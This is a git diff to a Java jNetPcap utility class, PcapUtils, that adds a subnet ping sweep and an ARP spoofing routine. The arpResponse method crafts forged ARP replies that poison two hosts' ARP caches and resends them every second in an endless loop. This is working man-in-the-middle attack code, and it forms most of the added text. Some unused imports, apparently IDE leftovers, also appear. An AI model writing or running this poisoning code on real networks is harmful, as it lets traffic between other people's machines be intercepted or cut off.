@@ -1,10 +1,21 @@
 package com.leyilikeang.common.util;
 
+import com.sun.corba.se.impl.orbutil.CorbaResourceUtil;
+import com.sun.media.sound.AbstractMidiDeviceProvider;
+import com.sun.xml.internal.messaging.saaj.soap.JpegDataContentHandler;
 import org.jnetpcap.Pcap;
 import org.jnetpcap.PcapBpfProgram;
 import org.jnetpcap.PcapIf;
+import org.jnetpcap.packet.JMemoryPacket;
+import org.jnetpcap.packet.JPacket;
+import org.jnetpcap.packet.format.FormatUtils;
+import org.jnetpcap.protocol.JProtocol;
+import org.jnetpcap.protocol.lan.Ethernet;
+import org.omg.PortableInterceptor.AdapterManagerIdHelper;
 
+import javax.swing.*;
 import javax.xml.crypto.KeySelector;
+import java.io.IOException;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
@@ -96,5 +107,210 @@ public class PcapUtils {
             return null;
         }
         return pcap;
+    }
+
+    public static void arpRequest() {
+        String sourceMac = PcapUtils.ipMacMap.get(index).get("MAC").toLowerCase().replace("-", " ");
+        String sourceIp = PcapUtils.ipMacMap.get(index).get("IP");
+        String prefixIp = sourceIp.substring(0, sourceIp.lastIndexOf(".") + 1);
+        sourceIp = ConvertUtils.ipToHex(sourceIp);
+        String destinationMac = "ff ff ff ff ff ff";
+
+        final String request = destinationMac + sourceMac
+                + ConstantUtils.Ethernet.ETHER_TYPE_ARP.getValue()
+                + ConstantUtils.Arp.HARDWARE_TYPE_ETHER.getValue()
+                + ConstantUtils.Arp.UPPER_PROTOCOL_TYPE_IP.getValue()
+                + ConstantUtils.Arp.MAC_LENGTH.getValue()
+                + ConstantUtils.Arp.IP_LENGTH.getValue()
+                + ConstantUtils.Arp.OPCODE_REQUEST.getValue()
+                + sourceMac + sourceIp + "00 00 00 00 00 00";
+//                + destinationIp
+//                + "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00";
+
+
+        PcapIf device = alldevs.get(index);
+
+        int snaplen = 64 * 1024;
+        int flags = Pcap.MODE_PROMISCUOUS;
+        int timeout = 10 * 1000;
+        Pcap pcap = Pcap.openLive(device.getName(), snaplen, flags, timeout, errbuf);
+
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                for (int i = 1; i < 64; i++) {
+                    String ping = prefixIp + i;
+                    String cmd = "ping " + ping;
+                    Runtime run = Runtime.getRuntime();
+                    try {
+                        run.exec(cmd);
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                    }
+
+//                    String destinationIp = ConvertUtils.ipToHex(prefixIp + i);
+//                    String arpRequest = request;
+//                    arpRequest += destinationIp;
+//                    JPacket packet = new JMemoryPacket(JProtocol.ETHERNET_ID, arpRequest);
+//                    packet.scan(Ethernet.ID);
+//                    for (int j = 0; j < 4; j++) {
+//                        if (pcap.sendPacket(packet) != Pcap.OK) {
+//                            System.out.println(pcap.getErr());
+//                        }
+//                    }
+                }
+            }
+        }).start();
+
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                for (int i = 64; i < 128; i++) {
+                    String ping = prefixIp + i;
+                    String cmd = "ping " + ping;
+                    Runtime run = Runtime.getRuntime();
+                    try {
+                        run.exec(cmd);
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                    }
+
+
+//                    String destinationIp = ConvertUtils.ipToHex(prefixIp + i);
+//                    String arpRequest = request;
+//                    arpRequest += destinationIp;
+//                    JPacket packet = new JMemoryPacket(JProtocol.ETHERNET_ID, arpRequest);
+//                    packet.scan(Ethernet.ID);
+//                    for (int j = 0; j < 4; j++) {
+//                        if (pcap.sendPacket(packet) != Pcap.OK) {
+//                            System.out.println(pcap.getErr());
+//                        }
+//                    }
+                }
+            }
+        }).start();
+
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                for (int i = 128; i < 192; i++) {
+                    String ping = prefixIp + i;
+                    String cmd = "ping " + ping;
+                    Runtime run = Runtime.getRuntime();
+                    try {
+                        run.exec(cmd);
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                    }
+
+
+//                    String destinationIp = ConvertUtils.ipToHex(prefixIp + i);
+//                    String arpRequest = request;
+//                    arpRequest += destinationIp;
+//                    JPacket packet = new JMemoryPacket(JProtocol.ETHERNET_ID, arpRequest);
+//                    packet.scan(Ethernet.ID);
+//                    for (int j = 0; j < 4; j++) {
+//                        if (pcap.sendPacket(packet) != Pcap.OK) {
+//                            System.out.println(pcap.getErr());
+//                        }
+//                    }
+                }
+            }
+        }).start();
+
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                for (int i = 192; i < 255; i++) {
+                    String ping = prefixIp + i;
+                    String cmd = "ping " + ping;
+                    Runtime run = Runtime.getRuntime();
+                    try {
+                        run.exec(cmd);
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                    }
+
+
+//                    String destinationIp = ConvertUtils.ipToHex(prefixIp + i);
+//                    String arpRequest = request;
+//                    arpRequest += destinationIp;
+//                    JPacket packet = new JMemoryPacket(JProtocol.ETHERNET_ID, arpRequest);
+//                    packet.scan(Ethernet.ID);
+//                    for (int j = 0; j < 4; j++) {
+//                        if (pcap.sendPacket(packet) != Pcap.OK) {
+//                            System.out.println(pcap.getErr());
+//                        }
+//                    }
+                }
+            }
+        }).start();
+    }
+
+    public static void arpResponse(String sourceIp, String sourceMac, String destinationIp, String destinationMac,
+                                   String realMac) {
+        String responseToOther = destinationMac + sourceMac
+                + ConstantUtils.Ethernet.ETHER_TYPE_ARP.getValue()
+                + ConstantUtils.Arp.HARDWARE_TYPE_ETHER.getValue()
+                + ConstantUtils.Arp.UPPER_PROTOCOL_TYPE_IP.getValue()
+                + ConstantUtils.Arp.MAC_LENGTH.getValue()
+                + ConstantUtils.Arp.IP_LENGTH.getValue()
+                + ConstantUtils.Arp.OPCODE_RESPONSE.getValue()
+                + sourceMac + sourceIp + destinationMac + destinationIp;
+
+        String responseToMe;
+        if (realMac == null) {
+            responseToMe = sourceMac + destinationMac
+                + ConstantUtils.Ethernet.ETHER_TYPE_ARP.getValue()
+                + ConstantUtils.Arp.HARDWARE_TYPE_ETHER.getValue()
+                + ConstantUtils.Arp.UPPER_PROTOCOL_TYPE_IP.getValue()
+                + ConstantUtils.Arp.MAC_LENGTH.getValue()
+                + ConstantUtils.Arp.IP_LENGTH.getValue()
+                + ConstantUtils.Arp.OPCODE_RESPONSE.getValue()
+                + destinationMac + destinationIp + sourceMac
+                + ConvertUtils.ipToHex(PcapUtils.ipMacMap.get(index).get("IP"));
+        } else {
+            responseToMe = sourceMac + realMac
+                    + ConstantUtils.Ethernet.ETHER_TYPE_ARP.getValue()
+                    + ConstantUtils.Arp.HARDWARE_TYPE_ETHER.getValue()
+                    + ConstantUtils.Arp.UPPER_PROTOCOL_TYPE_IP.getValue()
+                    + ConstantUtils.Arp.MAC_LENGTH.getValue()
+                    + ConstantUtils.Arp.IP_LENGTH.getValue()
+                    + ConstantUtils.Arp.OPCODE_RESPONSE.getValue()
+                    + realMac + sourceIp + sourceMac
+                    + ConvertUtils.ipToHex(PcapUtils.ipMacMap.get(index).get("IP"));
+        }
+
+        final JPacket responseToOtherPacket = new JMemoryPacket(JProtocol.ETHERNET_ID, responseToOther);
+        final JPacket responseToMePacket = new JMemoryPacket(JProtocol.ETHERNET_ID, responseToMe);
+
+        System.out.println(responseToOtherPacket.toString());
+        System.out.println(responseToMePacket.toString());
+
+        PcapIf device = alldevs.get(index);
+
+        int snaplen = 64 * 1024;
+        int flags = Pcap.MODE_PROMISCUOUS;
+        int timeout = 10 * 1000;
+        Pcap pcap = Pcap.openLive(device.getName(), snaplen, flags, timeout, errbuf);
+
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                while (true) {
+                    if (pcap.sendPacket(responseToOtherPacket) != Pcap.OK) {
+                        System.out.println(PcapUtils.pcap.getErr());
+                    }
+                    if (pcap.sendPacket(responseToMePacket) != Pcap.OK) {
+                        System.out.println(PcapUtils.pcap.getErr());
+                    }
+                    try {
+                        Thread.sleep(1000);
+                    } catch (InterruptedException e) {
+                        e.printStackTrace();
+                    }
+                }
+            }
+        }).start();
     }
 }
